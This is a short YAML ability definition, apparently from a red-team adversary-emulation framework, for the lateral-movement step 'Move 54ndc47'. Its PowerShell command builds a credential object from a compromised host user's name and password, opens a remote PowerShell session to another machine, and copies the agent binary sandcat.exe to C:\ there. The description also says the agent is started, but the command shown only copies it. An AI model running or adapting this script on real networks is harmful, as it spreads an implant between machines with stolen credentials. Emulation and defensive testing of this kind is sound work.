---

- id: 4908fdc4-74fc-4d7c-8935-26d11ad26a8d
  name: Move 54ndc47
  description: Copy 54ndc47 to remote host and start it
  tactic: lateral-movement
  technique:
    attack_id: T1105
    name: Remote File Copy
  executors:
    windows:
      command: |
        $username = "#{host.user.name}";
        $password = "#{host.user.password}";
        $secstr = New-Object -TypeName System.Security.SecureString;
        $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
        $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
        $File = [System.IO.File]::ReadAllBytes("#{files}\sandcat.exe");
        $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
        Invoke-Command -Session $session -ArgumentList $file -ScriptBlock{[System.IO.File]::WriteAllBytes("C:\sandcat.exe", $args)};
      payload: sandcat.exe
